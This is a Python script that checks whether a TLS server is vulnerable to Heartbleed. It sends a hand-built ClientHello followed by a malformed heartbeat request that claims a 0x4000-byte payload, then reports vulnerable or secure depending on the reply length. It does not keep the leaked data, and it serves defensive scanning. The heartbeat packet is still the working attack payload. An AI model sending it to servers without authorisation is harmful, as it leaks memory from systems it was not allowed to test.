'''
Written by Venetia Papadopoulouv (2024)
Refactoring by K.A. Draziotis    (Feb. 2025)
GPL v3.0
'''
import ssl
import struct
import sys
import socket

versions = {
    "TLSv1.0": 0x01,
    "TLSv1.1": 0x02,
    "TLSv1.2": 0x03,
    "TLSv1.3": 0x04
}


def tls_version_from_number(num):
    mapping = {
        768: "SSL 3.0",
        769: "TLS 1.0",
        770: "TLS 1.1",
        771: "TLS 1.2",
        772: "TLS 1.3"
    }
    return mapping.get(num)


def connect(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        return sock
    except Exception as e:
        return None


def construct_client_hello(ver):
    client_hello = [
        0x16,
        0x03, ver,
        0x00, 0xdc,
        0x01,
        0x00, 0x00, 0xd8,
        0x03, ver,
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
        0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
        0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
        0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
        0x00,
        0x00, 0x66,
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
        0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
        0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
        0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
        0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
        0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
        0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
        0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
        0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
        0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
        0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
        0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
        0x01,
        0x00,
        0x00, 0x49,
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
        0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
        0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
        0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
        0x00, 0x23, 0x00, 0x00,
        0x00, 0x0f, 0x00, 0x01, 0x01
    ]
    return client_hello


def construct_heartbeat(ver):
    heartbeat = [
        0x18,
        0x03, ver,
        0x00, 0x03,
        0x01,
        0x40, 0x00
    ]
    return heartbeat


def get_response(sock):
    try:
        header = sock.recv(5)
        if not header:
            return None, None, None

        message_type, ver, length = struct.unpack('>BHH', header)

        payload = b''
        while len(payload) != length:
            payload += sock.recv(length - len(payload))

        if not payload:
            return None, None, None

        return message_type, ver, payload
    except Exception as e:
        return None, None, None


def send_client_hello(sock, client_hello):
    if sock is None:
        return None, None, None

    sock.send(bytes(client_hello))
    t, v, m = get_response(sock)

    if t is None:
        return True, True, True
    elif t == 21:
        return v, m[0], True
    elif t == 22:
        return v, m[0], False
    return None, None, None


def send_heartbeat(sock, heartbeat):
    sock.send(bytes(heartbeat))

    while True:
        t, v, m = get_response(sock)

        if t is None:
            return {
                "success": True,
                "response": "No Heartbeat response received. Server is secure",
                "heartbleed": False,
            }
        if t == 24:
            if len(m) > 3:
                return {
                    "success": True,
                    "response": "Server is vulnerable",
                    "heartbleed": True,
                }
            else:
                return {
                    "success": True,
                    "response": "Server is secure",
                    "heartbleed": False,
                }

        if t == 21:
            return {
                "success": True,
                "response": "Server responded with alert",
                "heartbleed": False,
            }


def check_heartbleed(host, port):

    try:
        version = "TLSv1.3"
        sock = connect(host, port)
        ch = construct_client_hello(versions.get(version))
        server_version, message_type, success = send_client_hello(sock, ch)

        if server_version is None and message_type is None and success is None:
            return {
                "success": False,
                "response": "Couldn't connect to the server",
                "heartbleed": None
            }

        if server_version is True and message_type is True and success is True:
            return {
                "success": True,
                "response": "Server didn't respond to the client hello. Probably safe",
                "heartbleed": False
            }

        if server_version is not None and message_type is not None and success is True:
            return {
                "success": True,
                "response": "Server responded with alert message",
                "heartbleed": False
            }

        while True:
            t, v, p = get_response(sock)
            if t is None:
                return {
                    "success": True,
                    "response": "Server closed connection without sending server hello",
                    "heartbleed": False,
                }
            if t == 22 and p[0] == 0x0E:
                break

        hb = construct_heartbeat(server_version & 0xFF)
        return send_heartbeat(sock, hb)

    except ssl.SSLError as e:
        return {
            "success": False,
            "response": f"SSLv3 error: {str(e)}",
            "heartbleed": None
        }
    except Exception as e:
        return {
            "success": False,
            "response": f"Something went wrong {e}",
            "heartbleed": None
        }